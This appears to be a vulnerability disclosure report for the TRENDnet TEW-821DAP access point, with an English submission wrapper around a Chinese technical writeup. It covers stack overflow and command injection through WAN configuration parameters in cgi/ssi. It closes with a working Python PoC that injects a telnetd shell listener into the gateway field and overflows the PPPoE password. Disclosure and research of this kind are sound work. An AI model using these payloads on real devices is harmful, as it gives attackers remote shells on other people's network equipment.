# Technical Report: CVE-XXXX-XXXX5: TEW-821DAP cgi/ssi WAN Config Stack Overflow + Command Injection

## Normalized Submission Metadata

| Field | Value |
|---|---|
| Vendor | TRENDnet |
| Product | TRENDnet TEW-821DAP Access Point |
| Firmware / Version | v2.2.01b05 |
| Affected Component | cgi/ssi |
| Vulnerability Type | Stack-based Buffer Overflow / RCE |
| CWE | CWE-121 |
| CVSS | 9.8 Critical |
| Source Material | E:\competition\漏洞\vulns\vulns\vuln-821dap-ssi-wan-config-overflow |

## Executive Summary

The team-provided report describes a CVE-level vulnerability in TRENDnet TEW-821DAP Access Point affecting cgi/ssi. The issue is categorized as Stack-based Buffer Overflow / RCE and is supported by the copied PoC and evidence files in this package.

## Original Technical Detail

The original report is embedded below for reviewer convenience. The untouched copy is also available at source/REPORT.original.md.

---

# CVE-XXXX-XXXX5: TEW-821DAP cgi/ssi WAN Config Stack Overflow + Command Injection

| 字段 | 值 |
|------|-----|
| 厂商 | TRENDnet | 产品 | TEW-821DAP v2.2.01b05 |
| 二进制 | `https/cgi/ssi` (928 KB, MIPS32 BE) |
| 漏洞类型 | CWE-121 + CWE-77 |
| CVSS 3.1 | **9.8 Critical** |

---

## 1. 漏洞概述

Web CGI 程序 `https/cgi/ssi` 在处理 WAN 配置（静态 IP、PPPoE、PPTP、L2TP）时，通过 `safe_getenv()` 读取 HTTP 请求参数后直接传给 `sprintf()` 或 `_system()`。函数名 "safe_getenv" 是误导性的——它内部使用 `getenv()` 但完全没有做输入过滤。涉及 16 个参数/函数路径。

---

## 2. FirmRec 符号执行证据

```
Simexp验证: 55+ 条日志全部命中 0x41414141
关联CVE: CVE-2020-10214, CVE-2019-1663, CVE-2020-25506, CVE-2022-30078,
         CVE-2022-30473, CVE-2020-28005, CVE-2021-27710
```

### 受影响函数 0x415578 (do_apply_wan_cgi)

```
0x415584: addiu $sp, $sp, -88    ; 帧 88B
0x41559C: sw    $ra, 84($sp)     ; $ra在 sp+84

栈溢出 (sprintf):
  cameo.wan.wan_pppoe_password_00 → sprintf → 栈溢出 (31次 0x41414141 命中)
  cameo.wan.wan_pptp_password     → sprintf → 栈溢出
  cameo.wan.wan_l2tp_password     → sprintf → 栈溢出

命令注入 (_system):
  cameo.wan.wan_static_ipaddr     → _system → 命令注入
  cameo.wan.wan_static_netmask    → _system → 命令注入
  cameo.wan.wan_static_gateway    → _system → 命令注入
  cameo.wan.wan_pppoe_username_00 → _system → 命令注入
  cameo.wan.wan_pppoe_password_00 → _system → 命令注入
  cameo.wan.wan_pptp_dynamic      → _system → 命令注入
  cameo.wan.wan_pptp_ipaddr       → _system → 命令注入
  cameo.wan.wan_pptp_netmask      → _system → 命令注入
  cameo.wan.wan_pptp_server_ip    → _system → 命令注入
  cameo.wan.wan_l2tp_dynamic      → _system → 命令注入
```

---

## 3. PoC

```python
import requests

# 命令注入 PoC: 通过 WAN static gateway 注入
requests.post("http://TEW-821DAP/cgi-bin/apply_wan.cgi", data={
    "wan_type": "static",
    "wan_static_gateway": "192.168.1.1; telnetd -l /bin/sh -p 9999 #",
    "wan_static_ipaddr": "192.168.1.100",
    "wan_static_netmask": "255.255.255.0",
})

# 栈溢出 PoC: 通过 PPPoE 密码溢出返回地址
requests.post("http://TEW-821DAP/cgi-bin/apply_wan.cgi", data={
    "wan_type": "pppoe",
    "wan_pppoe_password_00": "A" * 68 + "\x41\x41\x41\x41",
})
```

---

*证据: evidence/ 80条日志 | Simexp: 31次 0x41414141 命中 (CVE-2022-30078 @ 0x415578)*

